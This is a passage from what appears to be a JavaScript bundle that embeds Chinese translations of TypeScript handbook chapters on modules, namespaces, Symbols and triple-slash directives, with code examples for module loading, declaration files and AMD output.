? "matches" : "does not match" } ${ name }`);\n    }\n});\n```\n\n## 可选的模块加载和其它高级加载场景\n\n有时候，你只想在某种条件下才加载某个模块。 在TypeScript里，使用下面的方式来实现它和其它的高级加载场景，我们可以直接调用模块加载器并且可以保证类型完全。\n\n编译器会检测是否每个模块都会在生成的JavaScript中用到。 如果一个模块标识符只在类型注解部分使用，并且完全没有在表达式中使用时，就不会生成`require`这个模块的代码。 省略掉没有用到的引用对性能提升是很有益的，并同时提供了选择性加载模块的能力。\n\n这种模式的核心是`import id = require("...")`语句可以让我们访问模块导出的类型。 模块加载器会被动态调用（通过`require`），就像下面`if`代码块里那样。 它利用了省略引用的优化，所以模块只在被需要时加载。 为了让这个模块工作，一定要注意`import`定义的标识符只能在表示类型处使用（不能在会转换成JavaScript的地方）。\n\n为了确保类型安全性，我们可以使用`typeof`关键字。 `typeof`关键字，当在表示类型的地方使用时，会得出一个类型值，这里就表示模块的类型。\n\n**示例：Node.js里的动态模块加载**\n\n```typescript\ndeclare function require(moduleName: string): any;\n\nimport { ZipCodeValidator as Zip } from "./ZipCodeValidator";\n\nif (needZipValidation) {\n    let ZipCodeValidator: typeof Zip = require("./ZipCodeValidator");\n    let validator = new ZipCodeValidator();\n    if (validator.isAcceptable("...")) { /* ... */ }\n}\n```\n\n**示例：require.js里的动态模块加载**\n\n```typescript\ndeclare function require(moduleNames: string[], onLoad: (...args: any[]) => void): void;\n\nimport * as Zip from "./ZipCodeValidator";\n\nif (needZipValidation) {\n    require(["./ZipCodeValidator"], (ZipCodeValidator: typeof Zip) => {\n        let validator = new ZipCodeValidator.ZipCodeValidator();\n        if (validator.isAcceptable("...")) { /* ... */ }\n    });\n}\n```\n\n**示例：System.js里的动态模块加载**\n\n```typescript\ndeclare const System: any;\n\nimport { ZipCodeValidator as Zip } from "./ZipCodeValidator";\n\nif (needZipValidation) {\n    System.import("./ZipCodeValidator").then((ZipCodeValidator: typeof Zip) => {\n        var x = new ZipCodeValidator();\n        if (x.isAcceptable("...")) { /* ... */ }\n    });\n}\n```\n\n## 使用其它的JavaScript库\n\n要想描述非TypeScript编写的类库的类型，我们需要声明类库所暴露出的API。\n\n我们叫它声明因为它不是“外部程序”的具体实现。 它们通常是在`.d.ts`文件里定义的。 如果你熟悉C/C++，你可以把它们当做`.h`文件。 让我们看一些例子。\n\n### 外部模块\n\n在Node.js里大部分工作是通过加载一个或多个模块实现的。 我们可以使用顶级的`export`声明来为每个模块都定义一个`.d.ts`文件，但最好还是写在一个大的`.d.ts`文件里。 我们使用与构造一个外部命名空间相似的方法，但是这里使用`module`关键字并且把名字用引号括起来，方便之后`import`。 例如：\n\n**node.d.ts \\(simplified excerpt\\)**\n\n```typescript\ndeclare module "url" {\n    export interface Url {\n        protocol?: string;\n        hostname?: string;\n        pathname?: string;\n    }\n\n    export function parse(urlStr: string, parseQueryString?, slashesDenoteHost?): Url;\n}\n\ndeclare module "path" {\n    export function normalize(p: string): string;\n    export function join(...paths: any[]): string;\n    export let sep: string;\n}\n```\n\n现在我们可以`/// <reference>` `node.d.ts`并且使用`import url = require("url");`或`import * as URL from "url"`加载模块。\n\n```typescript\n/// <reference path="node.d.ts"/>\nimport * as URL from "url";\nlet myUrl = URL.parse("http://www.typescriptlang.org");\n```\n\n#### 外部模块简写\n\n假如你不想在使用一个新模块之前花时间去编写声明，你可以采用声明的简写形式以便能够快速使用它。\n\n**declarations.d.ts**\n\n```typescript\ndeclare module "hot-new-module";\n```\n\n简写模块里所有导出的类型将是`any`。\n\n```typescript\nimport x, {y} from "hot-new-module";\nx(y);\n```\n\n#### 模块声明通配符\n\n某些模块加载器如[SystemJS](https://github.com/systemjs/systemjs/blob/master/docs/overview.md#plugin-syntax) 和[AMD](https://github.com/amdjs/amdjs-api/blob/master/LoaderPlugins.md)支持导入非JavaScript内容。 它们通常会使用一个前缀或后缀来表示特殊的加载语法。 模块声明通配符可以用来表示这些情况。\n\n```typescript\ndeclare module "*!text" {\n    const content: string;\n    export default content;\n}\n// Some do it the other way around.\ndeclare module "json!*" {\n    const value: any;\n    export default value;\n}\n```\n\n现在你可以就导入匹配`"*!text"`或`"json!*"`的内容了。\n\n```typescript\nimport fileContent from "./xyz.txt!text";\nimport data from "json!http://example.com/data.json";\nconsole.log(data, fileContent);\n```\n\n#### UMD模块\n\n有些模块被设计成兼容多个模块加载器，或者不使用模块加载器（全局变量）。 它们以[UMD](https://github.com/umdjs/umd)模块为代表。 这些库可以通过导入的形式或全局变量的形式访问。 例如：\n\n**math-lib.d.ts**\n\n```typescript\nexport function isPrime(x: number): boolean;\nexport as namespace mathLib;\n```\n\n之后，这个库可以在某个模块里通过导入来使用：\n\n```typescript\nimport { isPrime } from "math-lib";\nisPrime(2);\nmathLib.isPrime(2); // ERROR: can\'t use the global definition from inside a module\n```\n\n它同样可以通过全局变量的形式使用，但只能在某个脚本里。 （脚本是指一个不带有导入或导出的文件。）\n\n```typescript\nmathLib.isPrime(2);\n```\n\n## 创建模块结构指导\n\n### 尽可能地在顶层导出\n\n用户应该更容易地使用你模块导出的内容。 嵌套层次过多会变得难以处理，因此仔细考虑一下如何组织你的代码。\n\n从你的模块中导出一个命名空间就是一个增加嵌套的例子。 虽然命名空间有时候有它们的用处，在使用模块的时候它们额外地增加了一层。 这对用户来说是很不便的并且通常是多余的。\n\n导出类的静态方法也有同样的问题 - 这个类本身就增加了一层嵌套。 除非它能方便表述或便于清晰使用，否则请考虑直接导出一个辅助方法。\n\n#### 如果仅导出单个 `class` 或 `function`，使用 `export default`\n\n就像“在顶层上导出”帮助减少用户使用的难度，一个默认的导出也能起到这个效果。 如果一个模块就是为了导出特定的内容，那么你应该考虑使用一个默认导出。 这会令模块的导入和使用变得些许简单。 比如：\n\n**MyClass.ts**\n\n```typescript\nexport default class SomeType {\n  constructor() { ... }\n}\n```\n\n**MyFunc.ts**\n\n```typescript\nexport default function getThing() { return \'thing\'; }\n```\n\n**Consumer.ts**\n\n```typescript\nimport t from "./MyClass";\nimport f from "./MyFunc";\nlet x = new t();\nconsole.log(f());\n```\n\n对用户来说这是最理想的。他们可以随意命名导入模块的类型（本例为`t`）并且不需要多余的（.）来找到相关对象。\n\n#### 如果要导出多个对象，把它们放在顶层里导出\n\n**MyThings.ts**\n\n```typescript\nexport class SomeType { /* ... */ }\nexport function someFunc() { /* ... */ }\n```\n\n相反地，当导入的时候：\n\n#### 明确地列出导入的名字\n\n**Consumer.ts**\n\n```typescript\nimport { SomeType, SomeFunc } from "./MyThings";\nlet x = new SomeType();\nlet y = someFunc();\n```\n\n#### 使用命名空间导入模式当你要导出大量内容的时候\n\n**MyLargeModule.ts**\n\n```typescript\nexport class Dog { ... }\nexport class Cat { ... }\nexport class Tree { ... }\nexport class Flower { ... }\n```\n\n**Consumer.ts**\n\n```typescript\nimport * as myLargeModule from "./MyLargeModule.ts";\nlet x = new myLargeModule.Dog();\n```\n\n### 使用重新导出进行扩展\n\n你可能经常需要去扩展一个模块的功能。 JS里常用的一个模式是jQuery那样去扩展原对象。 如我们之前提到的，模块不会像全局命名空间对象那样去_合并_。 推荐的方案是_不要_去改变原来的对象，而是导出一个新的实体来提供新的功能。\n\n假设`Calculator.ts`模块里定义了一个简单的计算器实现。 这个模块同样提供了一个辅助函数来测试计算器的功能，通过传入一系列输入的字符串并在最后给出结果。\n\n**Calculator.ts**\n\n```typescript\nexport class Calculator {\n    private current = 0;\n    private memory = 0;\n    private operator: string;\n\n    protected processDigit(digit: string, currentValue: number) {\n        if (digit >= "0" && digit <= "9") {\n            return currentValue * 10 + (digit.charCodeAt(0) - "0".charCodeAt(0));\n        }\n    }\n\n    protected processOperator(operator: string) {\n        if (["+", "-", "*", "/"].indexOf(operator) >= 0) {\n            return operator;\n        }\n    }\n\n    protected evaluateOperator(operator: string, left: number, right: number): number {\n        switch (this.operator) {\n            case "+": return left + right;\n            case "-": return left - right;\n            case "*": return left * right;\n            case "/": return left / right;\n        }\n    }\n\n    private evaluate() {\n        if (this.operator) {\n            this.memory = this.evaluateOperator(this.operator, this.memory, this.current);\n        }\n        else {\n            this.memory = this.current;\n        }\n        this.current = 0;\n    }\n\n    public handleChar(char: string) {\n        if (char === "=") {\n            this.evaluate();\n            return;\n        }\n        else {\n            let value = this.processDigit(char, this.current);\n            if (value !== undefined) {\n                this.current = value;\n                return;\n            }\n            else {\n                let value = this.processOperator(char);\n                if (value !== undefined) {\n                    this.evaluate();\n                    this.operator = value;\n                    return;\n                }\n            }\n        }\n        throw new Error(`Unsupported input: \'${char}\'`);\n    }\n\n    public getResult() {\n        return this.memory;\n    }\n}\n\nexport function test(c: Calculator, input: string) {\n    for (let i = 0; i < input.length; i++) {\n        c.handleChar(input[i]);\n    }\n\n    console.log(`result of \'${input}\' is \'${c.getResult()}\'`);\n}\n```\n\n下面使用导出的`test`函数来测试计算器。\n\n**TestCalculator.ts**\n\n```typescript\nimport { Calculator, test } from "./Calculator";\n\n\nlet c = new Calculator();\ntest(c, "1+2*33/11="); // prints 9\n```\n\n现在扩展它，添加支持输入其它进制（十进制以外），让我们来创建`ProgrammerCalculator.ts`。\n\n**ProgrammerCalculator.ts**\n\n```typescript\nimport { Calculator } from "./Calculator";\n\nclass ProgrammerCalculator extends Calculator {\n    static digits = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"];\n\n    constructor(public base: number) {\n        super();\n        const maxBase = ProgrammerCalculator.digits.length;\n        if (base <= 0 || base > maxBase) {\n            throw new Error(`base has to be within 0 to ${maxBase} inclusive.`);\n        }\n    }\n\n    protected processDigit(digit: string, currentValue: number) {\n        if (ProgrammerCalculator.digits.indexOf(digit) >= 0) {\n            return currentValue * this.base + ProgrammerCalculator.digits.indexOf(digit);\n        }\n    }\n}\n\n// Export the new extended calculator as Calculator\nexport { ProgrammerCalculator as Calculator };\n\n// Also, export the helper function\nexport { test } from "./Calculator";\n```\n\n新的`ProgrammerCalculator`模块导出的API与原先的`Calculator`模块很相似，但却没有改变原模块里的对象。 下面是测试ProgrammerCalculator类的代码：\n\n**TestProgrammerCalculator.ts**\n\n```typescript\nimport { Calculator, test } from "./ProgrammerCalculator";\n\nlet c = new Calculator(2);\ntest(c, "001+010="); // prints 3\n```\n\n### 模块里不要使用命名空间\n\n当初次进入基于模块的开发模式时，可能总会控制不住要将导出包裹在一个命名空间里。 模块具有其自己的作用域，并且只有导出的声明才会在模块外部可见。 记住这点，命名空间在使用模块时几乎没什么价值。\n\n在组织方面，命名空间对于在全局作用域内对逻辑上相关的对象和类型进行分组是很便利的。 例如，在C\\#里，你会从`System.Collections`里找到所有集合的类型。 通过将类型有层次地组织在命名空间里，可以方便用户找到与使用那些类型。 然而，模块本身已经存在于文件系统之中，这是必须的。 我们必须通过路径和文件名找到它们，这已经提供了一种逻辑上的组织形式。 我们可以创建`/collections/generic/`文件夹，把相应模块放在这里面。\n\n命名空间对解决全局作用域里命名冲突来说是很重要的。 比如，你可以有一个`My.Application.Customer.AddForm`和`My.Application.Order.AddForm` -- 两个类型的名字相同，但命名空间不同。 然而，这对于模块来说却不是一个问题。 在一个模块里，没有理由两个对象拥有同一个名字。 从模块的使用角度来说，使用者会挑出他们用来引用模块的名字，所以也没有理由发生重名的情况。\n\n> 更多关于模块和命名空间的资料查看[命名空间和模块](namespaces-and-modules.md)\n\n### 危险信号\n\n以下均为模块结构上的危险信号。重新检查以确保你没有在对模块使用命名空间：\n\n* 文件的顶层声明是`export namespace Foo { ... }` （删除`Foo`并把所有内容向上层移动一层）©\n* 多个文件的顶层具有同样的`export namespace Foo {` （不要以为这些会合并到一个`Foo`中！）\n\n',kl='# 命名空间和模块\n\n> **关于术语的一点说明:** 请务必注意一点，TypeScript 1.5里术语名已经发生了变化。 “内部模块”现在称做“命名空间”。 “外部模块”现在则简称为“模块”，这是为了与[ECMAScript 2015](http://www.ecma-international.org/ecma-262/6.0/)里的术语保持一致，\\(也就是说 `module X {` 相当于现在推荐的写法 `namespace X {`\\)。\n\n## 介绍\n\n这篇文章将概括介绍在TypeScript里使用模块与命名空间来组织代码的方法。 我们也会谈及命名空间和模块的高级使用场景，和在使用它们的过程中常见的陷阱。\n\n查看[模块](modules.md)章节了解关于模块的更多信息。 查看[命名空间](namespaces.md)章节了解关于命名空间的更多信息。\n\n## 使用命名空间\n\n命名空间是位于全局命名空间下的一个普通的带有名字的JavaScript对象。 这令命名空间十分容易使用。 它们可以在多文件中同时使用，并通过`--outFile`结合在一起。 命名空间是帮你组织Web应用不错的方式，你可以把所有依赖都放在HTML页面的`<script>`标签里。\n\n但就像其它的全局命名空间污染一样，它很难去识别组件之间的依赖关系，尤其是在大型的应用中。\n\n## 使用模块\n\n像命名空间一样，模块可以包含代码和声明。 不同的是模块可以_声明_它的依赖。\n\n模块会把依赖添加到模块加载器上（例如CommonJs / Require.js）。 对于小型的JS应用来说可能没必要，但是对于大型应用，这一点点的花费会带来长久的模块化和可维护性上的便利。 模块也提供了更好的代码重用，更强的封闭性以及更好的使用工具进行优化。\n\n对于Node.js应用来说，模块是默认并推荐的组织代码的方式。\n\n从ECMAScript 2015开始，模块成为了语言内置的部分，应该会被所有正常的解释引擎所支持。 因此，对于新项目来说推荐使用模块做为组织代码的方式。\n\n## 命名空间和模块的陷阱\n\n这部分我们会描述常见的命名空间和模块的使用陷阱和如何去避免它们。\n\n### 对模块使用`/// <reference>`\n\n一个常见的错误是使用`/// <reference>`引用模块文件，应该使用`import`。 要理解这之间的区别，我们首先应该弄清编译器是如何根据`import`路径（例如，`import x from "...";`或`import x = require("...")`里面的`...`，等等）来定位模块的类型信息的。\n\n编译器首先尝试去查找相应路径下的`.ts`，`.tsx`再或者`.d.ts`。 如果这些文件都找不到，编译器会查找_外部模块声明_。 回想一下，它们是在`.d.ts`文件里声明的。\n\n* `myModules.d.ts`\n\n```typescript\n// In a .d.ts file or .ts file that is not a module:\ndeclare module "SomeModule" {\n    export function fn(): string;\n}\n```\n\n* `myOtherModule.ts`\n\n```typescript\n/// <reference path="myModules.d.ts" />\nimport * as m from "SomeModule";\n```\n\n这里的引用标签指定了外来模块的位置。 这就是一些TypeScript例子中引用`node.d.ts`的方法。\n\n### 不必要的命名空间\n\n如果你想把命名空间转换为模块，它可能会像下面这个文件：\n\n* `shapes.ts`\n\n```typescript\nexport namespace Shapes {\n    export class Triangle { /* ... */ }\n    export class Square { /* ... */ }\n}\n```\n\n顶层的模块`Shapes`包裹了`Triangle`和`Square`。 对于使用它的人来说这是令人迷惑和讨厌的：\n\n* `shapeConsumer.ts`\n\n```typescript\nimport * as shapes from "./shapes";\nlet t = new shapes.Shapes.Triangle(); // shapes.Shapes?\n```\n\nTypeScript里模块的一个特点是不同的模块永远也不会在相同的作用域内使用相同的名字。 因为使用模块的人会为它们命名，所以完全没有必要把导出的符号包裹在一个命名空间里。\n\n再次重申，不应该对模块使用命名空间，使用命名空间是为了提供逻辑分组和避免命名冲突。 模块文件本身已经是一个逻辑分组，并且它的名字是由导入这个模块的代码指定，所以没有必要为导出的对象增加额外的模块层。\n\n下面是改进的例子：\n\n* `shapes.ts`\n\n```typescript\nexport class Triangle { /* ... */ }\nexport class Square { /* ... */ }\n```\n\n* `shapeConsumer.ts`\n\n```typescript\nimport * as shapes from "./shapes";\nlet t = new shapes.Triangle();\n```\n\n### 模块的取舍\n\n就像每个JS文件对应一个模块一样，TypeScript里模块文件与生成的JS文件也是一一对应的。 这会产生一种影响，根据你指定的目标模块系统的不同，你可能无法连接多个模块源文件。 例如当目标模块系统为`commonjs`或`umd`时，无法使用`outFile`选项，但是在TypeScript 1.8以上的版本[能够](../doc/handbook/release%20notes/TypeScript%201.8.md#concatenate-amd-and-system-modules-with---outfile)使用`outFile`当目标为`amd`或`system`。\n\n',Cl='# 命名空间\n\n> **关于术语的一点说明:** 请务必注意一点，TypeScript 1.5里术语名已经发生了变化。 “内部模块”现在称做“命名空间”。 “外部模块”现在则简称为“模块”，这是为了与[ECMAScript 2015](http://www.ecma-international.org/ecma-262/6.0/)里的术语保持一致，\\(也就是说 `module X {` 相当于现在推荐的写法 `namespace X {`\\)。\n\n## 介绍\n\n这篇文章描述了如何在TypeScript里使用命名空间（之前叫做“内部模块”）来组织你的代码。 就像我们在术语说明里提到的那样，“内部模块”现在叫做“命名空间”。 另外，任何使用`module`关键字来声明一个内部模块的地方都应该使用`namespace`关键字来替换。 这就避免了让新的使用者被相似的名称所迷惑。\n\n## 第一步\n\n我们先来写一段程序并将在整篇文章中都使用这个例子。 我们定义几个简单的字符串验证器，假设你会使用它们来验证表单里的用户输入或验证外部数据。\n\n### 所有的验证器都放在一个文件里\n\n```typescript\ninterface StringValidator {\n    isAcceptable(s: string): boolean;\n}\n\nlet lettersRegexp = /^[A-Za-z]+$/;\nlet numberRegexp = /^[0-9]+$/;\n\nclass LettersOnlyValidator implements StringValidator {\n    isAcceptable(s: string) {\n        return lettersRegexp.test(s);\n    }\n}\n\nclass ZipCodeValidator implements StringValidator {\n    isAcceptable(s: string) {\n        return s.length === 5 && numberRegexp.test(s);\n    }\n}\n\n// Some samples to try\nlet strings = ["Hello", "98052", "101"];\n\n// Validators to use\nlet validators: { [s: string]: StringValidator; } = {};\nvalidators["ZIP code"] = new ZipCodeValidator();\nvalidators["Letters only"] = new LettersOnlyValidator();\n\n// Show whether each string passed each validator\nfor (let s of strings) {\n    for (let name in validators) {\n        let isMatch = validators[name].isAcceptable(s);\n        console.log(`\'${ s }\' ${ isMatch ? "matches" : "does not match" } \'${ name }\'.`);\n    }\n}\n```\n\n## 命名空间\n\n随着更多验证器的加入，我们需要一种手段来组织代码，以便于在记录它们类型的同时还不用担心与其它对象产生命名冲突。 因此，我们把验证器包裹到一个命名空间内，而不是把它们放在全局命名空间下。\n\n下面的例子里，把所有与验证器相关的类型都放到一个叫做`Validation`的命名空间里。 因为我们想让这些接口和类在命名空间之外也是可访问的，所以需要使用`export`。 相反的，变量`lettersRegexp`和`numberRegexp`是实现的细节，不需要导出，因此它们在命名空间外是不能访问的。 在文件末尾的测试代码里，由于是在命名空间之外访问，因此需要限定类型的名称，比如`Validation.LettersOnlyValidator`。\n\n### 使用命名空间的验证器\n\n```typescript\nnamespace Validation {\n    export interface StringValidator {\n        isAcceptable(s: string): boolean;\n    }\n\n    const lettersRegexp = /^[A-Za-z]+$/;\n    const numberRegexp = /^[0-9]+$/;\n\n    export class LettersOnlyValidator implements StringValidator {\n        isAcceptable(s: string) {\n            return lettersRegexp.test(s);\n        }\n    }\n\n    export class ZipCodeValidator implements StringValidator {\n        isAcceptable(s: string) {\n            return s.length === 5 && numberRegexp.test(s);\n        }\n    }\n}\n\n// Some samples to try\nlet strings = ["Hello", "98052", "101"];\n\n// Validators to use\nlet validators: { [s: string]: Validation.StringValidator; } = {};\nvalidators["ZIP code"] = new Validation.ZipCodeValidator();\nvalidators["Letters only"] = new Validation.LettersOnlyValidator();\n\n// Show whether each string passed each validator\nfor (let s of strings) {\n    for (let name in validators) {\n        console.log(`"${ s }" - ${ validators[name].isAcceptable(s) ? "matches" : "does not match" } ${ name }`);\n    }\n}\n```\n\n## 分离到多文件\n\n当应用变得越来越大时，我们需要将代码分离到不同的文件中以便于维护。\n\n### 多文件中的命名空间\n\n现在，我们把`Validation`命名空间分割成多个文件。 尽管是不同的文件，它们仍是同一个命名空间，并且在使用的时候就如同它们在一个文件中定义的一样。 因为不同文件之间存在依赖关系，所以我们加入了引用标签来告诉编译器文件之间的关联。 我们的测试代码保持不变。\n\n#### Validation.ts\n\n```typescript\nnamespace Validation {\n    export interface StringValidator {\n        isAcceptable(s: string): boolean;\n    }\n}\n```\n\n#### LettersOnlyValidator.ts\n\n```typescript\n/// <reference path="Validation.ts" />\nnamespace Validation {\n    const lettersRegexp = /^[A-Za-z]+$/;\n    export class LettersOnlyValidator implements StringValidator {\n        isAcceptable(s: string) {\n            return lettersRegexp.test(s);\n        }\n    }\n}\n```\n\n#### ZipCodeValidator.ts\n\n```typescript\n/// <reference path="Validation.ts" />\nnamespace Validation {\n    const numberRegexp = /^[0-9]+$/;\n    export class ZipCodeValidator implements StringValidator {\n        isAcceptable(s: string) {\n            return s.length === 5 && numberRegexp.test(s);\n        }\n    }\n}\n```\n\n#### Test.ts\n\n```typescript\n/// <reference path="Validation.ts" />\n/// <reference path="LettersOnlyValidator.ts" />\n/// <reference path="ZipCodeValidator.ts" />\n\n// Some samples to try\nlet strings = ["Hello", "98052", "101"];\n\n// Validators to use\nlet validators: { [s: string]: Validation.StringValidator; } = {};\nvalidators["ZIP code"] = new Validation.ZipCodeValidator();\nvalidators["Letters only"] = new Validation.LettersOnlyValidator();\n\n// Show whether each string passed each validator\nfor (let s of strings) {\n    for (let name in validators) {\n        console.log(`"${ s }" - ${ validators[name].isAcceptable(s) ? "matches" : "does not match" } ${ name }`);\n    }\n}\n```\n\n当涉及到多文件时，我们必须确保所有编译后的代码都被加载了。 我们有两种方式。\n\n第一种方式，把所有的输入文件编译为一个输出文件，需要使用`--outFile`标记：\n\n```text\ntsc --outFile sample.js Test.ts\n```\n\n编译器会根据源码里的引用标签自动地对输出进行排序。你也可以单独地指定每个文件。\n\n```text\ntsc --outFile sample.js Validation.ts LettersOnlyValidator.ts ZipCodeValidator.ts Test.ts\n```\n\n第二种方式，我们可以编译每一个文件（默认方式），那么每个源文件都会对应生成一个JavaScript文件。 然后，在页面上通过`<script>`标签把所有生成的JavaScript文件按正确的顺序引进来，比如：\n\n#### MyTestPage.html \\(excerpt\\)\n\n```markup\n    <script src="Validation.js" type="text/javascript" />\n    <script src="LettersOnlyValidator.js" type="text/javascript" />\n    <script src="ZipCodeValidator.js" type="text/javascript" />\n    <script src="Test.js" type="text/javascript" />\n```\n\n## 别名\n\n另一种简化命名空间操作的方法是使用`import q = x.y.z`给常用的对象起一个短的名字。 不要与用来加载模块的`import x = require(\'name\')`语法弄混了，这里的语法是为指定的符号创建一个别名。 你可以用这种方法为任意标识符创建别名，也包括导入的模块中的对象。\n\n```typescript\nnamespace Shapes {\n    export namespace Polygons {\n        export class Triangle { }\n        export class Square { }\n    }\n}\n\nimport polygons = Shapes.Polygons;\nlet sq = new polygons.Square(); // Same as "new Shapes.Polygons.Square()"\n```\n\n注意，我们并没有使用`require`关键字，而是直接使用导入符号的限定名赋值。 这与使用`var`相似，但它还适用于类型和导入的具有命名空间含义的符号。 重要的是，对于值来讲，`import`会生成与原始符号不同的引用，所以改变别名的`var`值并不会影响原始变量的值。\n\n## 使用其它的JavaScript库\n\n为了描述不是用TypeScript编写的类库的类型，我们需要声明类库导出的API。 由于大部分程序库只提供少数的顶级对象，命名空间是用来表示它们的一个好办法。\n\n我们称其为声明是因为它不是外部程序的具体实现。 我们通常在`.d.ts`里写这些声明。 如果你熟悉C/C++，你可以把它们当做`.h`文件。 让我们看一些例子。\n\n### 外部命名空间\n\n流行的程序库D3在全局对象`d3`里定义它的功能。 因为这个库通过一个`<script>`标签加载（不是通过模块加载器），它的声明文件使用内部模块来定义它的类型。 为了让TypeScript编译器识别它的类型，我们使用外部命名空间声明。 比如，我们可以像下面这样写：\n\n#### D3.d.ts \\(部分摘录\\)\n\n```typescript\ndeclare namespace D3 {\n    export interface Selectors {\n        select: {\n            (selector: string): Selection;\n            (element: EventTarget): Selection;\n        };\n    }\n\n    export interface Event {\n        x: number;\n        y: number;\n    }\n\n    export interface Base extends Selectors {\n        event: Event;\n    }\n}\n\ndeclare var d3: D3.Base;\n```\n\n',jl='# Symbols\n\n## 介绍\n\n自ECMAScript 2015起，`symbol`成为了一种新的原生类型，就像`number`和`string`一样。\n\n`symbol`类型的值是通过`Symbol`构造函数创建的。\n\n```typescript\nlet sym1 = Symbol();\n\nlet sym2 = Symbol("key"); // 可选的字符串key\n```\n\nSymbols是不可改变且唯一的。\n\n```typescript\nlet sym2 = Symbol("key");\nlet sym3 = Symbol("key");\n\nsym2 === sym3; // false, symbols是唯一的\n```\n\n像字符串一样，symbols也可以被用做对象属性的键。\n\n```typescript\nconst sym = Symbol();\n\nlet obj = {\n    [sym]: "value"\n};\n\nconsole.log(obj[sym]); // "value"\n```\n\nSymbols也可以与计算出的属性名声明相结合来声明对象的属性和类成员。\n\n```typescript\nconst getClassNameSymbol = Symbol();\n\nclass C {\n    [getClassNameSymbol](){\n       return "C";\n    }\n}\n\nlet c = new C();\nlet className = c[getClassNameSymbol](); // "C"\n```\n\n## 众所周知的Symbols\n\n除了用户定义的symbols，还有一些已经众所周知的内置symbols。 内置symbols用来表示语言内部的行为。\n\n以下为这些symbols的列表：\n\n### `Symbol.hasInstance`\n\n方法，会被`instanceof`运算符调用。构造器对象用来识别一个对象是否是其实例。\n\n### `Symbol.isConcatSpreadable`\n\n布尔值，表示当在一个对象上调用`Array.prototype.concat`时，这个对象的数组元素是否可展开。\n\n### `Symbol.iterator`\n\n方法，被`for-of`语句调用。返回对象的默认迭代器。\n\n### `Symbol.match`\n\n方法，被`String.prototype.match`调用。正则表达式用来匹配字符串。\n\n### `Symbol.replace`\n\n方法，被`String.prototype.replace`调用。正则表达式用来替换字符串中匹配的子串。\n\n### `Symbol.search`\n\n方法，被`String.prototype.search`调用。正则表达式返回被匹配部分在字符串中的索引。\n\n### `Symbol.species`\n\n函数值，为一个构造函数。用来创建派生对象。\n\n### `Symbol.split`\n\n方法，被`String.prototype.split`调用。正则表达式来用分割字符串。\n\n### `Symbol.toPrimitive`\n\n方法，被`ToPrimitive`抽象操作调用。把对象转换为相应的原始值。\n\n### `Symbol.toStringTag`\n\n方法，被内置方法`Object.prototype.toString`调用。返回创建对象时默认的字符串描述。\n\n### `Symbol.unscopables`\n\n对象，它自己拥有的属性会被`with`作用域排除在外。\n\n',Ml='# 三斜线指令\n\n三斜线指令是包含单个XML标签的单行注释。 注释的内容会做为编译器指令使用。\n\n三斜线指令_仅_可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在一个语句或声明之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。\n\n## `/// <reference path="..." />`\n\n`/// <reference path="..." />`指令是三斜线指令中最常见的一种。 它用于声明文件间的_依赖_。\n\n三斜线引用告诉编译器在编译过程中要引入的额外的文件。\n\n当使用`--out`或`--outFile`时，它也可以做为调整输出内容顺序的一种方法。 文件在输出文件内容中的位置与经过预处理后的输入顺序一致。\n\n### 预处理输入文件\n\n编译器会对输入文件进行预处理来解析所有三斜线引用指令。 在这个过程中，额外的文件会加到编译过程中。\n\n这个过程会以一些_根文件_开始； 它们是在命令行中指定的文件或是在`tsconfig.json`中的`"files"`列表里的文件。 这些根文件按指定的顺序进行预处理。 在一个文件被加入列表前，它包含的所有三斜线引用都要被处理，还有它们包含的目标。 三斜线引用以它们在文件里出现的顺序，使用深度优先的方式解析。\n\n一个三斜线引用路径是相对于包含它的文件的，如果不是根文件。\n\n### 错误\n\n引用不存在的文件会报错。 一个文件用三斜线指令引用自己会报错。\n\n### 使用 `--noResolve`\n\n如果指定了`--noResolve`编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。\n\n## `/// <reference types="..." />`\n\n与`/// <reference path="..." />`指令相似（用于声明_依赖_），`/// <reference types="..." />`指令声明了对某个包的依赖。\n\n对这些包的名字的解析与在`import`语句里对模块名的解析类似。 可以简单地把三斜线类型引用指令当做`import`声明的包。\n\n例如，把`/// <reference types="node" />`引入到声明文件，表明这个文件使用了`@types/node/index.d.ts`里面声明的名字； 并且，这个包需要在编译阶段与声明文件一起被包含进来。\n\n仅当在你需要写一个`d.ts`文件时才使用这个指令。\n\n对于那些在编译阶段生成的声明文件，编译器会自动地添加`/// <reference types="..." />`； _当且仅当_结果文件中使用了引用的包里的声明时才会在生成的声明文件里添加`/// <reference types="..." />`语句。\n\n若要在`.ts`文件里声明一个对`@types`包的依赖，使用`--types`命令行选项或在`tsconfig.json`里指定。 查看[在`tsconfig.json`里使用`@types`，`typeRoots`和`types`](../project-config/tsconfig.json.md#types-typeroots-and-types)了解详情。\n\n## `/// <reference no-default-lib="true"/>`\n\n这个指令把一个文件标记成_默认库_。 你会在`lib.d.ts`文件和它不同的变体的顶端看到这个注释。\n\n这个指令告诉编译器在编译过程中_不要_包含这个默认库（比如，`lib.d.ts`）。 这与在命令行上使用`--noLib`相似。\n\n还要注意，当传递了`--skipDefaultLibCheck`时，编译器只会忽略检查带有`/// <reference no-default-lib="true"/>`的文件。\n\n## `/// <amd-module />`\n\n默认情况下生成的AMD模块都是匿名的。 但是，当一些工具需要处理生成的模块时会产生问题，比如`r.js`。\n\n`amd-module`指令允许给编译器传入一个可选的模块名：\n\n#### amdModule.ts\n\n```typescript\n///<amd-module name=\'NamedModule\'/>\nexport class C {\n}\n```\n\n这会将`NamedModule`传入到AMD `define`函数里：\n\n#### amdModule.js\n\n```javascript\ndefine("NamedModule", ["require", "exports"], function (require, exports) {\n    var C = (function () {\n        function C() {\n        }\n        return C;\n    })();\n    exports.C = C;\n});\n```\n\n## `/// <amd-dependency />`\n\n> **注意**：这个指令被废弃了。使用`import "moduleName";`语句代替。\n\n`/// <amd-dependency path="x" />`告诉编译器有一个非TypeScript模块依赖需要被注入，做为目标模块`require`调用的一部分。\n\n`amd-dependency`指令也可以带一个可选的`name`属性；它允许我们为amd-dependency传入一个可选名字：\n\n```typescript\n/// <amd-dependency path="legacy/moduleA" name="moduleA"/>\ndeclare var moduleA:MyType\nmoduleA.callStuff()\n```\n\n生成的JavaScript代码：\n\n```javascript\ndefine(["require", "exports", "legacy/moduleA"], function (require, exports, moduleA) {\n    moduleA.callStuff()\n});\n```\n\n',Rl="# 类型兼容性\n\n## 介绍\n\nTypeScript里的类型兼容性是基于结构子类型的。 